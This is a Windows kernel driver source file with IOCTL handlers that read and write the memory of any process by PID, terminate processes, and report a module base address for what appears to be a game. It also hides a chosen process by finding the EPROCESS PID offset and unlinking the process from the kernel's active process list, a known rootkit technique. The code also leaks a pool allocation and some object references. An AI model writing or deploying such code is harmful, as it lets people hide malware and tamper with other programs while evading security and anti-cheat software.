#pragma warning(disable: 4022)
#include "iohandle.h"

NTSTATUS HandleMWBaseAddrRequest(PIRP Irp, PNTSTATUS Status, PULONG ByteIO, ULONG mw_addr) {
	PULONG Output = (PULONG)Irp->AssociatedIrp.SystemBuffer;
	*Output = mw_addr;
	DbgPrintEx(0, 0, "Replied to libiworld_micro_ADDR request!\n");
	*Status = STATUS_SUCCESS;
	*ByteIO = sizeof(*Output);
	return STATUS_SUCCESS;
}

NTSTATUS HandleKeReadRequest(PNTSTATUS Status, PULONG ByteIO, PKERNEL_READ_REQUEST ReadInput) {
	PEPROCESS Process;
	DbgPrintEx(0, 0, "[DEBUG] Get sigread for PID=%ld at %ld!", ReadInput->ProcessID, ReadInput->Address);
	if (NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)ReadInput->ProcessID, &Process))) {
		if (NT_SUCCESS(KernelReadProcessMemory(Process, (PVOID)ReadInput->Address, (PVOID)ReadInput->pBuff, ReadInput->Size))) {
			*Status = STATUS_SUCCESS;
			*ByteIO = sizeof(KERNEL_READ_REQUEST);
		}
		else return STATUS_UNSUCCESSFUL;
	}
	else return STATUS_UNSUCCESSFUL;
	return STATUS_SUCCESS;
}

NTSTATUS HandleKeWriteRequest(PNTSTATUS Status, PULONG ByteIO, PKERNEL_WRITE_REQUEST ReadInput) {
	PEPROCESS Process;
	DbgPrintEx(0, 0, "[DEBUG] Get write request to process with PID=%ld at 0x%x!", ReadInput->ProcessID, ReadInput->Address);
	if (NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)ReadInput->ProcessID, &Process))) {
		if NT_SUCCESS(KernelWriteProcessMemory(Process, ReadInput->pBuff, ReadInput->Address, ReadInput->Size)) {
			*Status = STATUS_SUCCESS;
			*ByteIO = sizeof(KERNEL_WRITE_REQUEST);
		}
		else return STATUS_UNSUCCESSFUL;
	}
	else return STATUS_UNSUCCESSFUL;
	return STATUS_SUCCESS;
}
NTSTATUS HandleKeKillProcessRequest(PNTSTATUS Status, PKERNEL_KILL_PROCESS_REQUEST ReadInput) {
	DbgPrintEx(0, 0, "[DEBUG] Get sigkill with pid=%ld!", ReadInput->ProcId);
	NTSTATUS stat;
	if (NT_SUCCESS(ZwTerminateProcess(ReadInput->hProcess, ReadInput->ExitCode))) {
		stat = STATUS_SUCCESS;
	}
	else stat = STATUS_UNSUCCESSFUL;
	*Status = stat;
	return stat;
}
NTSTATUS HandleKeHideProcessRequest(PKERNEL_HIDE_PROCESS_REQUEST ReadInput) {

	UINT32 pid = ReadInput->ProcId;
	LPSTR result = ExAllocatePool(NonPagedPool, sizeof(ULONG) + 20);;
	DbgPrintEx(0, 0, "[DEBUG] Get sighide with pid=%ld!", ReadInput->ProcId);


	// Get PID offset nt!_EPROCESS.UniqueProcessId
	ULONG PID_OFFSET = find_eprocess_pid_offset();

	// Check if offset discovery was successful 
	if (PID_OFFSET == 0) {
		return STATUS_UNSUCCESSFUL;
	}

	// Get LIST_ENTRY offset nt!_EPROCESS.ActiveProcessLinks
	ULONG LIST_OFFSET = PID_OFFSET;


	// Check Architecture using pointer size
	INT_PTR ptr;

	// Ptr size 8 if compiled for a 64-bit machine, 4 if compiled for 32-bit machine
	LIST_OFFSET += sizeof(ptr);

	// Get current process
	PEPROCESS CurrentEPROCESS = PsGetCurrentProcess();

	// Initialize other variables
	PLIST_ENTRY CurrentList = (PLIST_ENTRY)((ULONG_PTR)CurrentEPROCESS + LIST_OFFSET);
	PUINT32 CurrentPID = (PUINT32)((ULONG_PTR)CurrentEPROCESS + PID_OFFSET);

	// Check self 
	if (*(UINT32*)CurrentPID == pid) {
		remove_links(CurrentList);
		return STATUS_SUCCESS;
	}

	// Record the starting position
	PEPROCESS StartProcess = CurrentEPROCESS;

	// Move to next item
	CurrentEPROCESS = (PEPROCESS)((ULONG_PTR)CurrentList->Flink - LIST_OFFSET);
	CurrentPID = (PUINT32)((ULONG_PTR)CurrentEPROCESS + PID_OFFSET);
	CurrentList = (PLIST_ENTRY)((ULONG_PTR)CurrentEPROCESS + LIST_OFFSET);

	// Loop until we find the right process to remove
	// Or until we circle back
	while ((ULONG_PTR)StartProcess != (ULONG_PTR)CurrentEPROCESS) {

		// Check item
		if (*(UINT32*)CurrentPID == pid) {
			remove_links(CurrentList);
			return STATUS_SUCCESS;
		}

		// Move to next item
		CurrentEPROCESS = (PEPROCESS)((ULONG_PTR)CurrentList->Flink - LIST_OFFSET);
		CurrentPID = (PUINT32)((ULONG_PTR)CurrentEPROCESS + PID_OFFSET);
		CurrentList = (PLIST_ENTRY)((ULONG_PTR)CurrentEPROCESS + LIST_OFFSET);
	}

	return STATUS_SUCCESS;
}

ULONG find_eprocess_pid_offset() {


	ULONG pid_ofs = 0; // The offset we're looking for
	int idx = 0;                // Index 
	ULONG pids[3];				// List of PIDs for our 3 processes
	PEPROCESS eprocs[3];		// Process list, will contain 3 processes

	//Select 3 process PIDs and get their EPROCESS Pointer
	for (int i = 16; idx < 3; i += 4)
	{
		if (NT_SUCCESS(PsLookupProcessByProcessId((HANDLE)i, &eprocs[idx])))
		{
			pids[idx] = i;
			idx++;
		}
	}


	/*
	Go through the EPROCESS structure and look for the PID
	we can start at 0x20 because UniqueProcessId should
	not be in the first 0x20 bytes,
	also we should stop after 0x300 bytes with no success
	*/

	for (int i = 0x20; i < 0x300; i += 4)
	{
		if ((*(ULONG*)((UCHAR*)eprocs[0] + i) == pids[0])
			&& (*(ULONG*)((UCHAR*)eprocs[1] + i) == pids[1])
			&& (*(ULONG*)((UCHAR*)eprocs[2] + i) == pids[2]))
		{
			pid_ofs = i;
			break;
		}
	}

	ObDereferenceObject(eprocs[0]);
	ObDereferenceObject(eprocs[1]);
	ObDereferenceObject(eprocs[2]);


	return pid_ofs;
}
void remove_links(PLIST_ENTRY Current) {

	PLIST_ENTRY Previous, Next;

	Previous = (Current->Blink);
	Next = (Current->Flink);

	// Loop over self (connect previous with next)
	Previous->Flink = Next;
	Next->Blink = Previous;

	// Re-write the current LIST_ENTRY to point to itself (avoiding BSOD)
	Current->Blink = (PLIST_ENTRY)&Current->Flink;
	Current->Flink = (PLIST_ENTRY)&Current->Flink;

	return;

}